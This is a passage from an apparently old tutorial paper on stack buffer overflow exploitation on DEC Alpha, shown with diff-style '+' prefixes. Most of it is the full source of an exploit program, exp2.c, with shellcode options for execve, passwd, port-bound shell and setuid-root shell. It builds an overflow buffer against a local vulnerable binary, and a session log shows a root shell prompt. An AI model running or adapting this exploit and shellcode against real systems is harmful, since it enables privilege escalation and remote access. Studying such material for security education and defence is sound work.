+"\x80\xf4\xe2\x47"                   /*   cmoveq   zero,0x17,v0 */
+"\x90\x04\xff\x47"                   /*   cmoveq   zero,zero,a0 */
+"\xdd\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                   /*   cmoveq   zero,0x3b,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\x86\xfd\x1a\x22"                   /*   lda      a0,-634(ra)   */
+"\x8e\xfd\xfa\xb3"                   /*   stl      zero,-626(ra) */
+"\xd7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+;
+
+
+unsigned char alpha_ret[] = "\x01\x80\x5a\x6b";
+
+/********************************************************************
+ * END PRELIMINARY                                                  *
+ ********************************************************************/
+
+
+/********************************************************************
+ * ALPHA EXPLOIT STUFF                                              *
+ ********************************************************************/
+
+unsigned long
+get_sp(void)
+{
+    __asm__("mov $30, $0");
+}
+
+
+int
+aalign(unsigned long *x, int y)
+{
+    /*
+     * Align x to y boundary
+     */
+    unsigned long   z;
+
+
+    z = *x;
+
+    while (1) {
+        if ((z % y) == 0)
+            break;
+        z++;
+    }
+
+    *x = z;
+    return (0);
+}
+
+
+void
+ret_fix(unsigned long *ret, unsigned long offset)
+{
+    unsigned long   i;
+
+
+    i = offset;
+    aalign(&i, ALPHA_INSN_ALGN);
+
+    *ret -= i;
+
+    return;
+}
+
+/********************************************************************
+ * END ALPHA EXPLOIT STUFF                                          *
+ ********************************************************************/
+
+void
+exp2_Usage(int status)
+{
+
+
+    printf("exp2 : by andrew_darqui of someplace                     \n"
+           "\tUsage:                                         \n"
+           "\t\t./exp2 <shellcode_type> <optional offset>    \n"
+           "\t\t\tShellcode types:                           \n"
+           "\t\t\t1) execve                                  \n"
+           "\t\t\t2) passwd                                  \n"
+           "\t\t\t3) portshell                               \n"
+           "\t\t\t4) portshell + setuid 0                    \n");
+
+    exit(status);
+}
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   ret_addr = 0,
+                    offset = OFFSET;
+    unsigned char *ab = NULL,
+                   *ptr = NULL,
+                   *shellc_ptr = NULL;
+
+
+   if (argc < 2)
+       exp2_Usage(-1);
+
+   switch (atoi(argv[1])) {
+   case 1:
+       {
+           /*
+            * alpha_exec_shellcode
+            */
+           shellc_ptr = alpha_exec_shellcode;
+
+             break;
+       }
+   case 2:
+       {
+             /*
+              * alpha_passwd_shellcode
+              */
+             shellc_ptr = alpha_passwd_shellcode;
+
+             break;
+       }
+   case 3:
+       {
+             /*
+              * alpha_portshellcode
+              */
+             shellc_ptr = alpha_portshellcode;
+
+             break;
+       }
+   case 4:
+       {
+             /*
+              * alpha_pshell_setuid
+              */
+             shellc_ptr = alpha_pshell_setuid;
+
+           break;
+       }
+   default:
+       {
+           /*
+            * Incorrect shellcode value
+            */
+           exp2_Usage(-1);
+
+             break;
+       }
+   }
+
+   if (argc > 2)
+       offset = atol(argv[2]);
+
+    /*
+     * Initialize our attack buffer
+     */
+    ab = (unsigned char *) calloc(1, (BUFF_SIZE + EXTRA + RA));
+    if (ab == NULL) {
+        perror("main() : calloc() ");
+        exit(-1);
+    }
+
+
+    /*
+     * <rets><shellcode><evilret> or <specialnops><shellcode><evilret>
+     *
+     * We use a special type of nop:
+     * - ret ra,(ra),0x1
+     *
+     * This will walk its way up to our shellcode
+     */
+    for (ret_addr = 0; ret_addr <= (BUFF_SIZE + EXTRA + RA); ret_addr += 4)
+        memcpy((ab + ret_addr), alpha_ret, 4);
+
+    /*
+     * Point 'ptr' to the area where our shellcode will be
+     */
+    ptr = (ab + BUFF_SIZE + EXTRA);
+    ptr -= strlen(shellc_ptr);
+
+    /*
+     * Place our shellcode in the attack buffer (at ptr)
+     */
+    memcpy(ptr, shellc_ptr, strlen(shellc_ptr));
+
+    /*
+     * Get a relative stack address, then fix it up with our offset
+     */
+    ret_addr = get_sp();
+    ret_fix(&ret_addr, offset);
+
+    printf("Using return address [0x%lx]\n"
+           "Shellcode is %ld bytes.\n", ret_addr, strlen(shellc_ptr));
+
+    *(unsigned long *) (ab + BUFF_SIZE + EXTRA) = ret_addr;
+
+    execlp("./lvuln", "lvuln", ab, (char *) NULL);
+
+    return (0);
+}
+
++END exp2.c
+
+[andrew_darqui@blah exp]$ gcc exp2.c -o exp2
+[andrew_darqui@blah exp]$ ./exp2 1
+Using return address [0x11ffff8b0]
+Shellcode is 68 bytes.
+# exit
+
+      Success! We didn't even really change much in the actual
+      exploit code:
+
+              * Same code, all we have to do is change:
+              *
+              *     BUFF_SIZE to 640
+              *
+              *     EXTRA    to 0
+
+      As you can see, there was a really big difference with the buff
+      sizes, and we do not have an extra quad to overwrite on the stack.
+
+
+<07 : References>
+
+      www.digital.com
+
+
+<08 : Conclusion>
+
+      I hope you enjoyed this paper, and if you read the entire thing, gj.
+
+- Andrew Darqui
